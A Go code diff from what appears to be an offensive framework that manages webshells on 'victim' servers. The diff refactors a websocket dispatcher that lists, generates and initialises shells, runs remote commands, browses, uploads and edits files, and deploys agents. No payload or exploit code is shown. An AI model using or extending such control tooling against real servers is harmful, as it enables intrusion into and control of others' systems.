@@ -413,20 +413,21 @@ func deployAgent(name string, uploadFile string, filename string, uploadData str
 //ParseSocket takes in data from the websocket, acts on it and then alerts the user of the outcome
 func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
 	//List webshells
-	if fname == "List" {
+	if fname == "list" {
 		AllWebShells.mutex.Lock()
 		defer AllWebShells.mutex.Unlock()
-		msg := "["
+		wsList := []string{}
+
 		for _, v := range AllWebShells.list {
 			newMsg, _ := json.Marshal(v)
-			msg += string(newMsg) + ","
+			wsList = append(wsList, string(newMsg))
+
 		}
-		msg = strings.TrimSuffix(msg, ",")
-		msg += "]"
+		msg, _ := json.Marshal(wsList)
 		outMsg := websockets.SendMessage{
-			Type:         "WebShell",
-			FunctionName: "List",
-			Data:         msg,
+			Type:         "webshell",
+			FunctionName: "list",
+			Data:         string(msg),
 			Success:      true,
 		}
 		websockets.AlertSingleUser(outMsg, ws)
@@ -436,16 +437,23 @@ func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
 	m := data.(map[string]interface{})
 
 	//Generate the shell based on the Type sent from the FE
-	if fname == "GenerateShell" {
+	if fname == "generateshell" {
 		if !validation.ValidateMapAlert(m, []string{"type"}, ws) {
 			return
 		}
 		success, filePath := generateShell(m["type"].(string))
-		path := "{\"Path\": \"" + filePath + "\"}"
+
+		toSend := struct {
+			Path string `json:"path"`
+		}{
+			Path: filePath,
+		}
+		msg, _ := json.Marshal(toSend)
+
 		outMsg := websockets.SendMessage{
-			Type:         "WebShell",
-			FunctionName: "GenerateShell",
-			Data:         path,
+			Type:         "webshell",
+			FunctionName: "generateshell",
+			Data:         string(msg),
 			Success:      success,
 		}
 		websockets.AlertSingleUser(outMsg, ws)
@@ -453,26 +461,26 @@ func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
 	}
 
 	//Init the webshell after placing it on the victim server using the victim URL and the webshells AuthToken
-	if fname == "Init" {
-		if !validation.ValidateMapAlert(m, []string{"URL", "AuthToken"}, ws) {
+	if fname == "init" {
+		if !validation.ValidateMapAlert(m, []string{"url", "authtoken"}, ws) {
 			return
 		}
-		success, rData, UUID := initCall(m["URL"].(string), m["AuthToken"].(string))
-		output := "{\"UUID\":\"" + UUID + "\", \"URL\":\"" + m["URL"].(string) + "\", \"AuthToken\":\"" + m["AuthToken"].(string) + "\", \"initData\": [" + rData + "]}"
-		outMsg := websockets.SendMessage{
-			Type:         "WebShell",
-			FunctionName: "Init",
-			Data:         output,
-			Success:      success,
+		success, rData, UUID := initCall(m["url"].(string), m["authtoken"].(string))
+		output := WebShellInitResponse{
+			UUID:      UUID,
+			URL:       m["url"].(string),
+			AuthToken: m["authtoken"].(string),
+			InitData:  rData,
 		}
-		websockets.AlertSingleUser(outMsg, ws)
+		output.SendToFE(success, ws)
+
 	} else {
-		if !validation.ValidateMapAlert(m, []string{"UUID", "Options"}, ws) {
+		if !validation.ValidateMapAlert(m, []string{"uuid", "options"}, ws) {
 			return
 		}
 
 		var options []string
-		switch val := m["Options"].(type) {
+		switch val := m["options"].(type) {
 		case []interface{}:
 			for _, x := range val {
 				options = append(options, x.(string))
@@ -480,67 +488,61 @@ func ParseSocket(fname string, data interface{}, ws *websocket.Conn) {
 		}
 
 		wShell := webShellPost{
-			UUID:    m["UUID"].(string),
+			UUID:    m["uuid"].(string),
 			Options: options,
 		}
 
 		//Functions of the webshell
-		if fname == "ExecuteCommand" {
+		if fname == "executecommand" {
 			success, rData := executeCommmand(wShell.UUID, wShell.Options[0], wShell.Options[1])
 			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "ExecuteCommand",
+				Type:         "webshell",
+				FunctionName: "executecommand",
 				Data:         rData,
 				Success:      success,
 			}
 			websockets.AlertSingleUser(outMsg, ws)
-		} else if fname == "FileBrowser" {
+
+		} else if fname == "filebrowser" {
 			success, rData, method := fileBrowser(wShell.UUID, wShell.Options[0], wShell.Options[1])
-			var output string
-			if method == "download" {
-				output = "{\"UUID\":\"" + wShell.UUID + "\", \"Method\":\"" + method + "\", \"initData\": [\"" + rData + "\"]}"
-			} else {
-				output = "{\"UUID\":\"" + wShell.UUID + "\", \"Method\":\"" + method + "\", \"initData\": [" + rData + "]}"
+			output := WebShellFileBrowserResponse{
+				UUID:     wShell.UUID,
+				Method:   method,
+				InitData: []string{rData},
 			}
-			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "FileBrowser",
-				Data:         output,
-				Success:      success,
-			}
-			websockets.AlertSingleUser(outMsg, ws)
-		} else if fname == "FileUpload" {
+			output.SendToFE(success, ws)
+		} else if fname == "fileupload" {
 			success, rData := fileUpload(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
 			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "FileUpload",
+				Type:         "webshell",
+				FunctionName: "fileupload",
 				Data:         rData,
 				Success:      success,
 			}
 			websockets.AlertSingleUser(outMsg, ws)
-		} else if fname == "FileEditor" {
+		} else if fname == "fileeditor" {
 			success, rData := fileEditor(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
 			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "FileEditor",
+				Type:         "webshell",
+				FunctionName: "fileeditor",
 				Data:         rData,
 				Success:      success,
 			}
 			websockets.AlertSingleUser(outMsg, ws)
-		} else if fname == "DeleteShell" {
+		} else if fname == "deleteshell" {
 			success, rData := deleteShell(wShell.UUID)
 			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "DeleteShell",
+				Type:         "webshell",
+				FunctionName: "deleteshell",
 				Data:         rData,
 				Success:      success,
 			}
 			websockets.AlertSingleUser(outMsg, ws)
-		} else if fname == "DeployAgent" {
+		} else if fname == "deployagent" {
 			success := deployAgent(wShell.UUID, wShell.Options[0], wShell.Options[1], wShell.Options[2])
 			outMsg := websockets.SendMessage{
-				Type:         "WebShell",
-				FunctionName: "DeployAgent",
+				Type:         "webshell",
+				FunctionName: "deployagent",
 				Data:         "",
 				Success:      success,
 			}
